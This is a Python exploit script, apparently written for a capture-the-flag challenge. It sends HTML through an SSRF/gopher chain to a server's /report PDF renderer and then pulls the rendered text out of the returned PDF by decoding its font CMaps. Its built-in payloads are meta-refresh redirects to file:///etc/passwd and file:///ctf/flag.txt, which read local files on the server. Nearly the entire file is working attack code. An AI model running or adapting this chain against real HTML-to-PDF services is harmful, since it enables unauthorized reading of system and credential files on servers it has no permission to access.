#!/usr/bin/env python3
"""Render HTML through the station's /report and pull the text back out of the PDF.

Uses the gopher channel (see gopher.py) so the request can be a real POST.

Qt embeds subset fonts, so the glyphs in the content stream are either literal
strings or 16-bit hex codes mapped through a ToUnicode CMap. Both are handled.
"""
import base64
import html as H
import json
import re
import sys
import time
import urllib.parse
import zlib

import gopher
import ssrf

HEX_TJ = re.compile(rb"<([0-9A-Fa-f]+)>\s*Tj")
LIT_TJ = re.compile(rb"\(((?:[^()\\]|\\.)*)\)\s*Tj")
TJ_ARRAY = re.compile(rb"\[(.*?)\]\s*TJ", re.S)
INNER_HEX = re.compile(rb"<([0-9A-Fa-f]+)>")
INNER_LIT = re.compile(rb"\(((?:[^()\\]|\\.)*)\)")
BFCHAR = re.compile(rb"beginbfchar(.*?)endbfchar", re.S)
BFCHAR_ITEM = re.compile(rb"<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>")
BFRANGE = re.compile(rb"beginbfrange(.*?)endbfrange", re.S)
BFRANGE_ITEM = re.compile(rb"<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*(<([0-9A-Fa-f]+)>|\[(.*?)\])", re.S)


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def report(content):
    """POST /report with the given HTML and return the parsed JSON (or None)."""
    feed = gopher.gopher_raw(
        "POST", "/report", "content=" + content,
        ["Content-Type: application/x-www-form-urlencoded"])
    st, pg = ssrf.get("/", feed=feed, timeout=70)
    m = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(m.group(1))) if m else ""
    head, sep, rest = raw.partition("\r\n\r\n")
    if not sep:
        w("no response body: %r" % raw[:200])
        return None
    try:
        return json.loads(rest)
    except Exception:
        w("body not JSON: %r" % rest[:240])
        return None


def streams(pdf):
    out = []
    for m in re.finditer(rb"stream\r?\n", pdf):
        e = pdf.find(b"endstream", m.end())
        blob = pdf[m.end():e].rstrip(b"\r\n")
        try:
            out.append(zlib.decompress(blob))
        except Exception:
            out.append(blob)
    return out


def tocmap(pdf):
    """Merge every ToUnicode CMap in the file into one code -> char table."""
    table = {}
    for s in streams(pdf):
        for block in BFCHAR.findall(s):
            for lo, hi in BFCHAR_ITEM.findall(block):
                try:
                    table[int(lo, 16)] = chr(int(hi, 16))
                except Exception:
                    pass
        for block in BFRANGE.findall(s):
            for g in BFRANGE_ITEM.findall(block):
                lo, hi = int(g[0], 16), int(g[1], 16)
                try:
                    if g[3]:                                  # <lo> <hi> <dst>
                        base = int(g[3], 16)
                        for k in range(lo, hi + 1):
                            table[k] = chr(base + (k - lo))
                    else:                                     # <lo> <hi> [d1 d2 ...]
                        dsts = re.findall(rb"<([0-9A-Fa-f]+)>", g[4])
                        for i, d in enumerate(dsts):
                            table[lo + i] = chr(int(d, 16))
                except Exception:
                    pass
    return table


def decode_hex(h, table):
    b = bytes.fromhex(h.decode() if isinstance(h, str) else h.decode())
    if table:                       # 16-bit Identity-H glyph ids
        chars = []
        for i in range(0, len(b) - 1, 2):
            chars.append(table.get(b[i] << 8 | b[i + 1], "?"))
        return "".join(chars)
    return b.decode("latin-1")


def extract(content, label=None, save=None):
    obj = report(content)
    w("=== %s" % (label or content[:70]))
    if not obj:
        return ""
    if "data" not in obj:
        w("  no data key: %r" % obj)
        return ""
    pdf = base64.b64decode(obj["data"])
    if save:
        open(save, "wb").write(pdf)
    w("  pdf=%d bytes (doc says %s)" % (len(pdf), obj.get("bytes")))
    table = tocmap(pdf)
    w("  ToUnicode entries=%d" % len(table))
    text = []
    for s in streams(pdf):
        for m in HEX_TJ.finditer(s):
            text.append(decode_hex(m.group(1), table))
        for m in LIT_TJ.finditer(s):
            text.append(m.group(1).decode("latin-1"))
        for m in TJ_ARRAY.finditer(s):
            for hm in INNER_HEX.finditer(m.group(1)):
                text.append(decode_hex(hm.group(1), table))
            for lm in INNER_LIT.finditer(m.group(1)):
                text.append(lm.group(1).decode("latin-1"))
    joined = "\n".join(t for t in text if t)
    w("  text (%d chars):" % len(joined))
    for line in joined.split("\n")[:60]:
        if line.strip():
            w("    | %s" % line[:160])
    return joined


if __name__ == "__main__":
    what = sys.argv[1] if len(sys.argv) > 1 else "sanity"
    if what == "sanity":
        extract("<h1>HELLOFLAGTEST</h1>", "plain <h1> render")
    elif what == "passwd":
        extract('<meta http-equiv="refresh" content="0;url=file:///etc/passwd">',
                "meta refresh -> /etc/passwd")
    elif what == "flag":
        extract('<meta http-equiv="refresh" content="0;url=file:///ctf/flag.txt">',
                "meta refresh -> /ctf/flag.txt")
    else:
        extract(what)
